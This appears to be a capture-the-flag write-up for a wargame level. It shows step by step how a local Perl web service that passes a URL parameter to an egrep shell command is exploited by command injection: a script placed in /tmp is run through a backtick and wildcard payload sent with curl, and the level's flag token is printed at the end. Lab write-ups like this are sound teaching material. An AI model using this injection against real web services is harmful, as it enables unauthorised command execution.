# Explanations of steps for level12

We can see a perl file in the home, let cat it
We can see after read and test, a server is running on port 4646, we can test it with curl
	curl localhost:4646

We also can see it take 2 parameters in URL x and y , and 1st one is passed to 2 regex and passed to a "egrep" shell command
We can so easy inject some code to execute with the "egrep" in shell command 
but 2 regex modify our string, 1st one transform all char in uppercase, the second one cut all .* so no .sh
we so can write a script in /tmp with the commande we want executed in lowercase and make it executable so
	echo "#!/bin/bash" > /tmp/SCRIPT12
	echo "getflag > /tmp/token12" >> /tmp/SCRIPT12
	chmod +x /tmp/SCRIPT12

and then do a curl command to execute the script, let do a wildcard to go in all root paths (/*/)
	curl localhost:4646?x=\`/*/SCRIPT12\`

And enjoy, the token is printed in /tmp/token12
	cat /tmp/token12

Token for level13 is: "g1qKMiRpXf53AWhDaU7FEkczr"
